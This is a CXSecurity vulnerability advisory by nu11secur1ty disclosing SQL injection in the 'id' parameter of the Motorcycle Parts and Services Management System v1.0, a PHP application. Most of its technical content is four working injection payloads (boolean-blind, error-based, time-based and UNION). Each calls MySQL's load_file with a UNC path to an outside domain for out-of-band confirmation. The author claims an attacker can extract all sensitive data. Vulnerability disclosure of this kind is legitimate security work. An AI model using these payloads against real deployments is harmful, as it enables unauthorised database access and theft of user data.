---
title: Motorcycle Parts and Services Management System - MPSSMS- PHP (by: oretnom23 ) v1.0 Multiple-SQLi
url: https://cxsecurity.com/issue/WLB-2024120008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-12-06
fetch_date: 2025-10-06T19:33:29.852009
---

# Motorcycle Parts and Services Management System - MPSSMS- PHP (by: oretnom23 ) v1.0 Multiple-SQLi

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Motorcycle Parts and Services Management System - MPSSMS- PHP (by: oretnom23 ) v1.0 Multiple-SQLi** **2024.12.05**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Medium**  Local: ****Yes****  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Titles: Motorcycle Parts and Services Management System - MPSSMS- PHP (by: oretnom23 ) v1.0 Multiple-SQLi
## Author: nu11secur1ty
## Date: 12/04/2024
## Vendor: https://github.com/oretnom23
## Software: https://www.sourcecodester.com/php/15142/motorcycle-parts-and-services-management-system-phpoop-free-source-code.html
## Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `id` parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load\_file('\\\\l6sb5xs4svis8hmnhre4yftvhmnfbcz32rtek29.namaikatiputkataoligofren.com\\bcu'))+' was submitted in the id parameter. This payload injects a SQL sub-query that calls MySQL's load\_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. The attacker can get all sensitive information from this system when he attacks it online!
STATUS: HIGH- Vulnerability
[+]Exploits:
- SQLi Multiple:
```mysql
---
Parameter: id (GET)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
Payload: p=products/view\_product&id=5'+(select load\_file('\\\\l6sb5xs4svis8hmnhre4yftvhmnfbcz32rtek29.namaikatiputkataoligofren.com\\bcu'))+'' OR NOT 8915=8915 AND 'BQWs'='BQWs
Type: error-based
Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: p=products/view\_product&id=5'+(select load\_file('\\\\l6sb5xs4svis8hmnhre4yftvhmnfbcz32rtek29.namaikatiputkataoligofren.com\\bcu'))+'' OR (SELECT 8925 FROM(SELECT COUNT(\*),CONCAT(0x7162706a71,(SELECT (ELT(8925=8925,1))),0x716a706271,FLOOR(RAND(0)\*2))x FROM INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a) AND 'oENT'='oENT
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: p=products/view\_product&id=5'+(select load\_file('\\\\l6sb5xs4svis8hmnhre4yftvhmnfbcz32rtek29.namaikatiputkataoligofren.com\\bcu'))+'' AND (SELECT 4601 FROM (SELECT(SLEEP(7)))axAk) AND 'RBqp'='RBqp
Type: UNION query
Title: MySQL UNION query (NULL) - 2 columns
Payload: p=products/view\_product&id=5'+(select load\_file('\\\\l6sb5xs4svis8hmnhre4yftvhmnfbcz32rtek29.namaikatiputkataoligofren.com\\bcu'))+'' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162706a71,0x694e62646745617175564a4e53674f6d6a79634b777a4c6c4e7076645948667754796b6370576a67,0x716a706271),NULL#
---
```
## Reproduce:
[href](https://www.patreon.com/posts/mpssms-php-by-v1-117287350)
## Demo PoC:
[href](https://www.patreon.com/posts/mpssms-php-by-v1-117287350)
## Time spent:
01:27:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024120008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top